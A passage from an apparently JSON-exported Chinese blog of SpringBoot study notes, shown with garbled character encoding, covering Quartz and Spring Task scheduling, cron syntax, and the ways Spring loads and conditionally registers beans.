<artifactId>spring-boot-starter-quartz</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šå®šä¹‰ä»»åŠ¡Beanï¼ŒæŒ‰ç…§Quartzçš„å¼€å‘è§„èŒƒåˆ¶ä½œï¼Œç»§æ‰¿QuartzJobBean\n\n```java\npublic class MyQuartz extends QuartzJobBean { //å·¥ä½œ\n    @Override\n    protected void executeInternal(JobExecutionContext context) throws JobExecutionException {\n        System.out.println(\"quartz task run...\");\n    }\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šåˆ›å»ºQuartzé…ç½®ç±»ï¼Œå®šä¹‰å·¥ä½œæ˜ç»†ï¼ˆJobDetailï¼‰ä¸è§¦å‘å™¨çš„ï¼ˆTriggerï¼‰bean\n\n```java\n@Configuration\npublic class QuartzConfig {\n    @Bean\n    public JobDetail printJobDetail(){ //å·¥ä½œæ˜ç»†\n        //ç»‘å®šå…·ä½“çš„å·¥ä½œ\n        return JobBuilder.newJob(MyQuartz.class).storeDurably().build();\n    }\n    @Bean\n    public Trigger printJobTrigger(){ //è§¦å‘å™¨\n        //è°ƒåº¦å™¨å®šä¹‰è§¦å‘å·¥ä½œçš„æ‰§è¡Œè§„åˆ™ ä»0så¼€å§‹æ¯éš”5sè¿è¡Œä¸€æ¬¡\n        ScheduleBuilder schedBuilder = CronScheduleBuilder.cronSchedule(\"0/5 * * * * ?\");\n        //ç»‘å®šå¯¹åº”çš„å·¥ä½œæ˜ç»†\n        return TriggerBuilder.newTrigger().forJob(printJobDetail()).withSchedule(schedBuilder).build();\n    }\n}\n```\n\n**å·¥ä½œæ˜ç»†**ä¸­è¦è®¾ç½®å¯¹åº”çš„å…·ä½“**å·¥ä½œ**ï¼Œä½¿ç”¨newJob()æ“ä½œä¼ å…¥å¯¹åº”çš„å·¥ä½œä»»åŠ¡ç±»å‹å³å¯ã€‚\n\n**è§¦å‘å™¨**éœ€è¦ç»‘å®šä»»åŠ¡ï¼Œä½¿ç”¨forJob()æ“ä½œä¼ å…¥ç»‘å®šçš„å·¥ä½œæ˜ç»†å¯¹è±¡ã€‚æ­¤å¤„å¯ä»¥ä¸ºå·¥ä½œæ˜ç»†è®¾ç½®åç§°ç„¶åä½¿ç”¨åç§°ç»‘å®šï¼Œä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨å¯¹åº”æ–¹æ³•ç»‘å®šã€‚\n\nè§¦å‘å™¨ä¸­æœ€æ ¸å¿ƒçš„è§„åˆ™æ˜¯æ‰§è¡Œæ—¶é—´ï¼Œæ­¤å¤„ä½¿ç”¨**è°ƒåº¦å™¨**å®šä¹‰æ‰§è¡Œæ—¶é—´ï¼Œæ‰§è¡Œæ—¶é—´æè¿°æ–¹å¼ä½¿ç”¨çš„æ˜¯`cronè¡¨è¾¾å¼`ã€‚\n\n**cronè¡¨è¾¾å¼è¯¦è§£**\n\nåœ¨spring 4.xä¸­å·²ç»ä¸æ”¯æŒ7ä¸ªå‚æ•°çš„cronè¡¨è¾¾å¼äº†ï¼Œè¦æ±‚å¿…é¡»æ˜¯6ä¸ªå‚æ•°ã€‚cronè¡¨è¾¾å¼æ ¼å¼å¦‚ä¸‹ï¼š\n\n```javascript\n{ç§’} {åˆ†} {æ—¶} {æ—¥æœŸï¼ˆå…·ä½“å“ªå¤©ï¼‰} {æœˆ} {æ˜ŸæœŸ}\n```\n\n-   ç§’ï¼šå¿…å¡«é¡¹ï¼Œå…è®¸çš„å€¼èŒƒå›´æ˜¯0-59ï¼Œæ”¯æŒçš„ç‰¹æ®Šç¬¦å·åŒ…æ‹¬`,` `-` `*` `/`ï¼Œ\n    -   `,`è¡¨ç¤ºç‰¹å®šçš„æŸä¸€ç§’æ‰ä¼šè§¦å‘ä»»åŠ¡\n    -   `-`è¡¨ç¤ºä¸€æ®µæ—¶é—´å†…ä¼šè§¦å‘ä»»åŠ¡\n    -   `*`è¡¨ç¤ºæ¯ä¸€ç§’éƒ½ä¼šè§¦å‘\n    -   `/`è¡¨ç¤ºä»å“ªä¸€ä¸ªæ—¶åˆ»å¼€å§‹ï¼Œæ¯éš”å¤šé•¿æ—¶é—´è§¦å‘ä¸€æ¬¡ä»»åŠ¡ã€‚\n-   åˆ†ï¼šå¿…å¡«é¡¹ï¼Œå…è®¸çš„å€¼èŒƒå›´æ˜¯0-59ï¼Œæ”¯æŒçš„ç‰¹æ®Šç¬¦å·å’Œç§’ä¸€æ ·ï¼Œå«ä¹‰ç±»æ¨\n-   æ—¶ï¼šå¿…å¡«é¡¹ï¼Œå…è®¸çš„å€¼èŒƒå›´æ˜¯0-23ï¼Œæ”¯æŒçš„ç‰¹æ®Šç¬¦å·å’Œç§’ä¸€æ ·ï¼Œå«ä¹‰ç±»æ¨\n-   æ—¥æœŸï¼šå¿…å¡«é¡¹ï¼Œå…è®¸çš„å€¼èŒƒå›´æ˜¯1-31ï¼Œæ”¯æŒçš„ç‰¹æ®Šç¬¦å·ç›¸æ¯”ç§’å¤šäº†`?`ï¼Œè¡¨ç¤ºä¸{æ˜ŸæœŸ}äº’æ–¥ï¼Œå³æ„å‘³ç€è‹¥æ˜ç¡®æŒ‡å®š{æ˜ŸæœŸ}è§¦å‘ï¼Œåˆ™è¡¨ç¤º{æ—¥æœŸ}æ— æ„ä¹‰ï¼Œä»¥å…å¼•èµ·å†²çªå’Œæ··ä¹±ã€‚\n-   æœˆï¼šå¿…å¡«é¡¹ï¼Œå…è®¸çš„å€¼èŒƒå›´æ˜¯1-12 (JAN-DEC)ï¼Œæ”¯æŒçš„ç‰¹æ®Šç¬¦å·ä¸ç§’ä¸€æ ·ï¼Œå«ä¹‰ç±»æ¨\n-   æ˜ŸæœŸï¼šå¿…å¡«é¡¹ï¼Œå…è®¸å€¼èŒƒå›´æ˜¯1~7 (SUN-SAT)ï¼Œ1ä»£è¡¨æ˜ŸæœŸå¤©ï¼ˆä¸€æ˜ŸæœŸçš„ç¬¬ä¸€å¤©ï¼‰ï¼Œä»¥æ­¤ç±»æ¨ï¼Œ7ä»£è¡¨æ˜ŸæœŸå…­ï¼Œæ”¯æŒçš„ç¬¦å·ç›¸æ¯”ç§’å¤šäº†`?`ï¼Œè¡¨è¾¾çš„å«ä¹‰æ˜¯ä¸{æ—¥æœŸ}äº’æ–¥ï¼Œå³æ„å‘³ç€è‹¥æ˜ç¡®æŒ‡å®š{æ—¥æœŸ}è§¦å‘ï¼Œåˆ™è¡¨ç¤º{æ˜ŸæœŸ}æ— æ„ä¹‰ã€‚\n\n**æ€»ç»“**\n\n1. springbootæ•´åˆQuartzå°±æ˜¯å°†Quartzå¯¹åº”çš„æ ¸å¿ƒå¯¹è±¡äº¤ç»™springå®¹å™¨ç®¡ç†ï¼ŒåŒ…å«ä¸¤ä¸ªå¯¹è±¡ï¼ŒJobDetailå’ŒTriggerå¯¹è±¡\n2. JobDetailå¯¹è±¡æè¿°çš„æ˜¯å·¥ä½œçš„æ‰§è¡Œä¿¡æ¯ï¼Œéœ€è¦ç»‘å®šä¸€ä¸ªQuartzJobBeanç±»å‹çš„å¯¹è±¡\n3. Triggerå¯¹è±¡å®šä¹‰äº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œéœ€è¦ä¸ºå…¶æŒ‡å®šç»‘å®šçš„JobDetailæ˜¯å“ªä¸ªï¼ŒåŒæ—¶è¦è®¾ç½®æ‰§è¡Œå‘¨æœŸè°ƒåº¦å™¨\n\n### â‘¡Task\n\n> Spring Taskæ˜¯Spring 3.0è‡ªå¸¦çš„å®šæ—¶ä»»åŠ¡ï¼Œå¯ä»¥å°†å®ƒçœ‹ä½œæˆä¸€ä¸ªè½»é‡çº§çš„Quartzï¼ŒåŠŸèƒ½è™½ç„¶æ²¡æœ‰Quartzé‚£æ ·å¼ºå¤§ï¼Œä½†æ˜¯ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œæ— éœ€å¢åŠ é¢å¤–çš„ä¾èµ–ï¼Œå¯ç›´æ¥ä¸Šæ‰‹ä½¿ç”¨ã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¼€å¯å®šæ—¶ä»»åŠ¡åŠŸèƒ½ï¼Œåœ¨å¼•å¯¼ç±»ä¸Šå¼€å¯å®šæ—¶ä»»åŠ¡åŠŸèƒ½çš„å¼€å…³ï¼Œä½¿ç”¨æ³¨è§£`@EnableScheduling`\n\n```java\n@SpringBootApplication\n@EnableScheduling //å¼€å¯å®šæ—¶ä»»åŠ¡åŠŸèƒ½\npublic class SpringbootTaskApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(Springboot22TaskApplication.class, args);\n    }\n}\n```\n\n**æ­¥éª¤â‘¡**ï¼šå®šä¹‰Beanï¼Œåœ¨å¯¹åº”è¦å®šæ—¶æ‰§è¡Œçš„æ“ä½œä¸Šæ–¹ï¼Œä½¿ç”¨æ³¨è§£`@Scheduled`å®šä¹‰æ‰§è¡Œçš„æ—¶é—´ï¼Œæ‰§è¡Œæ—¶é—´çš„æè¿°æ–¹å¼è¿˜æ˜¯cronè¡¨è¾¾å¼\n\n```java\n@Component\npublic class MyBean {\n    @Scheduled(cron = \"0/1 * * * * ?\")\n    public void print(){\n        System.out.println(\"spring task run...\");\n        System.out.println(Thread.currentThread().getName()); //è°ƒåº¦çº¿ç¨‹å ssm_1\n    }\n}\n```\n\n**æ­¥éª¤â‘¢**ï¼šå¦‚ä½•æƒ³å¯¹å®šæ—¶ä»»åŠ¡è¿›è¡Œç›¸å…³é…ç½®ï¼Œå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶è¿›è¡Œ\n\n```yaml\nspring:\n  task:\n   \tscheduling:\n      pool:\n       \tsize: 1\t\t\t\t\t\t\t# ä»»åŠ¡è°ƒåº¦çº¿ç¨‹æ± å¤§å° é»˜è®¤ 1\n      thread-name-prefix: ssm_      \t# è°ƒåº¦çº¿ç¨‹åç§°å‰ç¼€ é»˜è®¤ scheduling-      \n        shutdown:\n          await-termination: false\t\t# çº¿ç¨‹æ± å…³é—­æ—¶ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ\n          await-termination-period: 10s\t# è°ƒåº¦çº¿ç¨‹å…³é—­å‰æœ€å¤§ç­‰å¾…æ—¶é—´ï¼Œç¡®ä¿æœ€åä¸€å®šå…³é—­\n```\n\n**æ€»ç»“**\n\n1. spring taskéœ€è¦ä½¿ç”¨æ³¨è§£@EnableSchedulingå¼€å¯å®šæ—¶ä»»åŠ¡åŠŸèƒ½\n\n2. æ³¨è§£@Scheduledä¸ºå®šæ—¶æ‰§è¡Œçš„çš„ä»»åŠ¡è®¾ç½®æ‰§è¡Œå‘¨æœŸï¼Œæè¿°æ–¹å¼cronè¡¨è¾¾å¼\n\n## 6.æ•´åˆè®¤è¯æˆæƒ\n\n### â‘ Spring Security\n\n### â‘¡Shiro\n\n### â‘¢Oauth2\n\n## 7.æ•´åˆæ–‡æ¡£æ“ä½œ\n\n### â‘ PDF\n\n### â‘¡Word\n\n### â‘¢Excel\n\n### â‘£ä¸Šä¼ ä¸‹è½½\n\n## 8.æ•´åˆé€šçŸ¥\n\n### â‘ é‚®ä»¶\n\n### â‘¡é’‰é’‰\n\n### â‘¢å¾®ä¿¡\n\n### â‘£çŸ­ä¿¡\n\n\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-åŸç†ç¯‡","url":"/posts/41747.html","content":"\n> åŸç†ç¯‡åŒ…å«è‡ªåŠ¨é…ç½®å·¥ä½œæµç¨‹ã€è‡ªå®šä¹‰starterå¼€å‘ã€springbootç¨‹åºå¯åŠ¨æµç¨‹ã€æŒæ¡SpringBootå†…éƒ¨å·¥ä½œæµç¨‹ã€ç†è§£SpringBootæ•´åˆç¬¬ä¸‰æ–¹æŠ€æœ¯çš„åŸç†\n\nå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ä¹‹ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringBoot-åŸç†ç¯‡ã€‹ï¼Œä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡5å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š09-15\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š09-17\n- [x] ğŸ€æ€»ç»“ï¼šäº†è§£äº†ä¸ªå¤§æ¦‚ï¼Œåç»­å†æ·±å…¥ç ”ç©¶\n\n- å­¦ä¹ ç›®æ ‡\n\n| è¯¾ç¨‹å•å…ƒ                                   | å­¦ä¹ ç›®æ ‡                                                     |\n| ------------------------------------------ | ------------------------------------------------------------ |\n| <font color=\"#990000\"><b>åŸç†ç¯‡</b></font> | æŒæ¡SpringBootå†…éƒ¨å·¥ä½œæµç¨‹<br/>ç†è§£SpringBootæ•´åˆç¬¬ä¸‰æ–¹æŠ€æœ¯çš„åŸç†<br/>å®ç°è‡ªå®šä¹‰å¼€å‘æ•´åˆç¬¬ä¸‰æ–¹æŠ€æœ¯çš„ç»„ä»¶ |\n\n- å‰ç½®çŸ¥è¯†\n\n| è¯¾ç¨‹å•å…ƒ                                   | å‰ç½®çŸ¥è¯† | è¦æ±‚                                                         |\n| ------------------------------------------ | -------- | ------------------------------------------------------------ |\n| <font color=\"#990000\"><b>åŸç†ç¯‡</b></font> | Spring   | äº†è§£SpringåŠ è½½beançš„å„ç§æ–¹å¼<br/>çŸ¥é“Springå®¹å™¨åº•å±‚å·¥ä½œåŸç†ï¼Œèƒ½å¤Ÿé˜…è¯»ç®€å•çš„Springåº•å±‚æºç  |\n\n\n\n# 1.è‡ªåŠ¨é…ç½®å·¥ä½œæµç¨‹\n\n## â‘ beançš„åŠ è½½æ–¹å¼\n\n### â¶é…ç½®æ–‡ä»¶+`<bean/>`æ ‡ç­¾\n\næœ€åˆçº§çš„beançš„åŠ è½½æ–¹å¼å…¶å®å¯ä»¥ç›´å‡»springç®¡æ§beançš„æ ¸å¿ƒæ€æƒ³ï¼Œå°±æ˜¯æä¾›ç±»åï¼Œç„¶åspringå°±å¯ä»¥ç®¡ç†äº†ã€‚æ‰€ä»¥ç¬¬ä¸€ç§æ–¹å¼å°±æ˜¯ç»™å‡ºbeançš„ç±»åï¼Œå†…éƒ¨é€šè¿‡åå°„æœºåˆ¶åŠ è½½ç±»åååˆ›å»ºå¯¹è±¡ï¼Œå¯¹è±¡å°±æ˜¯springç®¡æ§çš„beanã€‚\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <!--xmlæ–¹å¼å£°æ˜è‡ªå·±å¼€å‘çš„bean-->\n    <bean id=\"cat\" class=\"Cat\"/>\n    <bean class=\"Dog\"/>\n\n    <!--xmlæ–¹å¼å£°æ˜ç¬¬ä¸‰æ–¹å¼€å‘çš„bean-->\n    <bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n    <bean class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n    <bean class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n</beans>\n```\n\n### â·é…ç½®æ–‡ä»¶æ‰«æ+æ³¨è§£\n\nç”±äºâ¶ä¸­éœ€è¦å°†springç®¡æ§çš„beanå…¨éƒ¨å†™åœ¨xmlæ–‡ä»¶ä¸­ï¼Œéå¸¸ä¸å‹å¥½ã€‚ç°åœ¨å“ªä¸€ä¸ªç±»è¦å—åˆ°springç®¡æ§åŠ è½½æˆbeanï¼Œå°±åœ¨è¿™ä¸ªç±»çš„ä¸Šé¢åŠ ä¸€ä¸ªæ³¨è§£ï¼Œè¿˜å¯ä»¥é¡ºå¸¦èµ·ä¸€ä¸ªbeançš„åå­—ï¼ˆidï¼‰ã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨çš„æ³¨è§£æœ‰`@Component`ä»¥åŠä¸‰ä¸ªè¡ç”Ÿæ³¨è§£`@Service`ã€`@Controller`ã€`@Repository`\n\n```java\n@Component(\"tom\")\npublic class Cat {}\n```\n\nç”±äºæˆ‘ä»¬æ— æ³•åœ¨ç¬¬ä¸‰æ–¹æä¾›çš„æŠ€æœ¯æºä»£ç ä¸­å»æ·»åŠ ä¸Šè¿°4ä¸ªæ³¨è§£ï¼Œå› æ­¤å½“ä½ éœ€è¦åŠ è½½ç¬¬ä¸‰æ–¹å¼€å‘çš„beançš„æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ–¹å¼å®šä¹‰æ³¨è§£å¼çš„beanã€‚å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ·»åŠ `@Bean`ï¼Œå½“å‰æ–¹æ³•çš„è¿”å›å€¼å°±å¯ä»¥äº¤ç»™springç®¡æ§ï¼Œè®°å¾—è¿™ä¸ªæ–¹æ³•æ‰€åœ¨çš„ç±»æ·»åŠ `@Component`æˆ–è€…`@Configuration`\n\n```JAVA\n@Component\npublic class DbConfig {\n    @Bean\n    public DruidDataSource dataSource(){\n        DruidDataSource ds = new DruidDataSource();\n        return ds;\n    }\n}\n```\n\nä¸Šé¢æä¾›çš„ä»…ä»…æ˜¯beançš„å£°æ˜ï¼Œspringå¹¶æ²¡æœ‰æ„ŸçŸ¥åˆ°è¿™äº›ä¸œè¥¿ï¼Œåƒæäº†ä¸Šè¯¾ç§¯æå›ç­”é—®é¢˜çš„ä½ ï¼Œæ‰‹ä¸¾çš„éå¸¸é«˜ï¼Œå¯æƒœè€å¸ˆéƒ½æ²¡æœ‰å¾€ä½ çš„æ–¹å‘çœ‹ä¸Šä¸€çœ¼ã€‚å¯ä»¥é€šè¿‡ä¸‹åˆ—xmlé…ç½®è®¾ç½®springå»æ£€æŸ¥å“ªäº›åŒ…ï¼Œå‘ç°å®šäº†å¯¹åº”æ³¨è§£ï¼Œå°±å°†å¯¹åº”çš„ç±»çº³å…¥springç®¡æ§èŒƒå›´ï¼Œå£°æ˜æˆbeanã€‚\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"\n       http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context\n       http://www.springframework.org/schema/context/spring-context.xsd\n    \">\n    <!--æŒ‡å®šæ‰«æåŠ è½½beançš„ä½ç½®-->\n    <context:component-scan base-package=\"com.jianjian.bean,com.jianjian.config\"/>\n</beans>\n```\n\n### â¸çº¯æ³¨è§£\n\nå®šä¹‰ä¸€ä¸ªé…ç½®ç±»å¹¶ä½¿ç”¨`@ComponentScan`æ›¿ä»£â·ä¸­çš„åŒ…æ‰«æè¿™ä¸ªåŠ¨ä½œã€‚\n\n```java\n@Configuration\n@ComponentScan({\"com.itheima.bean\",\"com.itheima.config\"})\npublic class SpringConfig {\n    @Bean\n    public DruidDataSource dataSource(){\n        DruidDataSource ds = new DruidDataSource();\n        return ds;\n    }\n}\n```\n\n### â¹@Importæ³¨è§£\n\nç”±äºä½¿ç”¨`@ComponentScan`æ‰«æçš„æ—¶å€™èŒƒå›´å¤ªå¤§äº†ï¼Œä½¿ç”¨@Importæ³¨è§£å®ƒå¯ä»¥åªåŠ è½½ä½ éœ€è¦çš„beanå³å¯ã€‚åªéœ€è¦åœ¨æ³¨è§£çš„å‚æ•°ä¸­å†™ä¸ŠåŠ è½½çš„ç±»å¯¹åº”çš„.classï¼Œè€Œä¸”åŠ è½½çš„beanå¯ä»¥ä¸ç”¨@Componentä¿®é¥°\n\n```java\n@Import({Dog.class,DbConfig.class})\npublic class SpringConfig {\n}\n```\n\n### âºç¼–ç¨‹å½¢å¼\n\nå‰é¢ä»‹ç»çš„åŠ è½½beançš„æ–¹å¼éƒ½æ˜¯åœ¨å®¹å™¨å¯åŠ¨é˜¶æ®µå®Œæˆbeançš„åŠ è½½ï¼Œä¸‹é¢è¿™ç§æ–¹å¼å°±æ¯”è¾ƒç‰¹æ®Šäº†ï¼Œå¯ä»¥åœ¨å®¹å™¨åˆå§‹åŒ–å®Œæˆåæ‰‹åŠ¨åŠ è½½beanã€‚é€šè¿‡è¿™ç§æ–¹å¼å¯ä»¥å®ç°ç¼–ç¨‹å¼æ§åˆ¶beançš„åŠ è½½ã€‚\n\n```java\npublic class App {\n    public static void main(String[] args) {\n        AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n        //ä¸Šä¸‹æ–‡å®¹å™¨å¯¹è±¡å·²ç»åˆå§‹åŒ–å®Œæ¯•åï¼Œæ‰‹å·¥åŠ è½½bean\n        ctx.register(Cat.class);\n    }\n}\n```\n\n### â»ImportSelectoræ¥å£\n\næ˜¯å¦å¯ä»¥åœ¨å®¹å™¨åˆå§‹åŒ–è¿‡ç¨‹ä¸­è¿›è¡Œæ§åˆ¶å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¿…é¡»çš„ã€‚å®ç°ImportSelectoræ¥å£çš„ç±»å¯ä»¥è®¾ç½®åŠ è½½çš„beançš„å…¨è·¯å¾„ç±»åï¼Œè®°å¾—ä¸€ç‚¹ï¼Œåªè¦èƒ½ç¼–ç¨‹å°±èƒ½åˆ¤å®šï¼Œèƒ½åˆ¤å®šæ„å‘³ç€å¯ä»¥æ§åˆ¶ç¨‹åºçš„è¿è¡Œèµ°å‘ï¼Œè¿›è€Œæ§åˆ¶ä¸€åˆ‡ã€‚\n\n```java\npublic class MyImportSelector implements ImportSelector {\n    @Override\n    public String[] selectImports(AnnotationMetadata metadata) {\n        //å„ç§æ¡ä»¶çš„åˆ¤å®šï¼Œåˆ¤å®šå®Œæ¯•åï¼Œå†³å®šæ˜¯å¦è£…è½½æŒ‡å®šçš„bean\n        boolean flag = metadata.hasAnnotation(\"org.springframework.context.annotation.Configuration\");\n        if(flag){\n            return new String[]{\"com.itheima.bean.Dog\"};\n        }\n        return new String[]{\"com.itheima.bean.Cat\"};\n    }\n}\n```\n\n### â¼ImportBeanDefinitionRegistraræ¥å£\n\nâ»ä¸­æä¾›äº†ç»™å®šç±»å…¨è·¯å¾„ç±»åæ§åˆ¶beanåŠ è½½çš„å½¢å¼ï¼Œå…¶å®beançš„åŠ è½½ä¸æ˜¯ä¸€ä¸ªç®€ç®€å•å•çš„å¯¹è±¡ï¼Œspringä¸­å®šä¹‰äº†ä¸€ä¸ªå«åšBeanDefinitionçš„ä¸œè¥¿ï¼Œå®ƒæ‰æ˜¯æ§åˆ¶beanåˆå§‹åŒ–åŠ è½½çš„æ ¸å¿ƒã€‚BeanDefinitionæ¥å£ä¸­ç»™å‡ºäº†è‹¥å¹²ç§æ–¹æ³•ï¼Œå¯ä»¥æ§åˆ¶beançš„ç›¸å…³å±æ€§ã€‚è¯´ä¸ªæœ€ç®€å•çš„ï¼Œåˆ›å»ºçš„å¯¹è±¡æ˜¯å•ä¾‹è¿˜æ˜¯éå•ä¾‹ï¼Œåœ¨BeanDefinitionä¸­å®šä¹‰äº†scopeå±æ€§å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªã€‚å¦‚æœä½ æ„Ÿè§‰â»ä¸­æ²¡æœ‰ç»™ä½ å¼€æ”¾å‡ºè¶³å¤Ÿçš„å¯¹beançš„æ§åˆ¶æ“ä½œï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ªç±»å®ç°ImportBeanDefinitionRegistraræ¥å£çš„æ–¹å¼å®šä¹‰beanï¼Œå¹¶ä¸”è¿˜å¯ä»¥è®©ä½ å¯¹beançš„åˆå§‹åŒ–è¿›è¡Œæ›´åŠ ç»†ç²’åº¦çš„æ§åˆ¶\n\n```java\npublic class MyRegistrar implements ImportBeanDefinitionRegistrar {\n    @Override\n    public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {\n        BeanDefinition beanDefinition = \t\n            BeanDefinitionBuilder.rootBeanDefinition(BookServiceImpl2.class).getBeanDefinition();\n        registry.registerBeanDefinition(\"bookService\",beanDefinition);\n    }\n}\n```\n\n### \tâ½BeanDefinitionRegistryPostProcessoræ¥å£\n\nå½“æŸç§ç±»å‹çš„beanè¢«æ¥äºŒè¿ä¸‰çš„ä½¿ç”¨å„ç§æ–¹å¼åŠ è½½åï¼Œåœ¨ä½ å¯¹æ‰€æœ‰åŠ è½½æ–¹å¼çš„åŠ è½½é¡ºåºæ²¡æœ‰å®Œå…¨ç†è§£æ¸…æ™°ä¹‹å‰ï¼Œä½ ä¸çŸ¥é“æœ€åè°è¯´äº†ç®—ã€‚BeanDefinitionRegistryPostProcessorï¼Œå…¨ç§°beanå®šä¹‰åå¤„ç†å™¨ï¼Œå®ƒåœ¨æ‰€æœ‰beanæ³¨å†Œéƒ½æŠ˜è…¾å®Œåï¼ŒæŠŠæœ€åä¸€é“å…³ï¼Œå®ƒæ˜¯æœ€åä¸€ä¸ªè¿è¡Œçš„ã€‚\n\n```java\npublic class MyPostProcessor implements BeanDefinitionRegistryPostProcessor {\n    @Override\n    public void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry) throws BeansException {\n        BeanDefinition beanDefinition = \n            BeanDefinitionBuilder.rootBeanDefinition(BookServiceImpl4.class).getBeanDefinition();\n        registry.registerBeanDefinition(\"bookService\",beanDefinition);\n    }\n}\n\n```\n\n## â‘¡beançš„åŠ è½½æ§åˆ¶\n\nä¼ä¸šçº§å¼€å‘ä¸­ä¸å¯èƒ½åœ¨springå®¹å™¨ä¸­è¿›è¡Œbeançš„é¥±å’Œå¼åŠ è½½çš„ã€‚åˆç†çš„åŠ è½½æ–¹å¼æ˜¯ç”¨ä»€ä¹ˆåŠ è½½ä»€ä¹ˆã€‚æ‰€ä»¥åœ¨springå®¹å™¨ä¸­ï¼Œé€šè¿‡åˆ¤æ–­ä¸€ä¸ªç±»çš„å…¨è·¯å¾„åæ˜¯å¦èƒ½å¤ŸæˆåŠŸåŠ è½½æ¥æ§åˆ¶beançš„åŠ è½½æ˜¯ä¸€ç§å¸¸è§æ“ä½œã€‚\n\n```java\npublic class MyImportSelector implements ImportSelector {\n    @Override\n    public String[] selectImports(AnnotationMetadata importingClassMetadata) {\n        try {\n            Class<?> clazz = Class.forName(\"com.jianjian.bean.Mouse\");\n            if(clazz != null) {\n                return new String[]{\"com.jianjian.bean.Cat\"};\n            }\n        } catch (ClassNotFoundException e) {\n\t\t\t\t\t\t//e.printStackTrace();\n            return new String[0];\n        }\n        return null;\n    }\n}\n```\n\né€šè¿‡ä¸Šè¿°çš„åˆ†æï¼Œå¯ä»¥çœ‹åˆ°æ­¤ç±»æ“ä½œå°†æˆä¸ºä¼ä¸šçº§å¼€å‘ä¸­çš„å¸¸è§æ“ä½œï¼Œäºæ˜¯springbootå°†æŠŠè¿™äº›å¸¸ç”¨æ“ä½œç»™æˆ‘ä»¬åšäº†ä¸€æ¬¡å°è£…ã€‚é€šè¿‡æ³¨è§£å®ç°ä¸Šé¢çš„æ“ä½œã€‚\n\n- `@ConditionalOnClass`æ³¨è§£å®ç°äº†å½“è™šæ‹Ÿæœºä¸­åŠ è½½äº†æŒ‡å®šç±»æ—¶æ‰åŠ è½½å¯¹åº”çš„beanã€‚\n\n```java\n@Bean\n@ConditionalOnClass(name = \"com.jianjian.bean.Wolf\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnMissingClass`æ³¨è§£å®ç°äº†è™šæ‹Ÿæœºä¸­æ²¡æœ‰åŠ è½½æŒ‡å®šçš„ç±»æ‰åŠ è½½å¯¹åº”çš„beanã€‚\n\n```java\n@Bean\n@ConditionalOnMissingClass(\"com.jianjian.bean.Dog\")\npublic Cat tom(){\n    return new 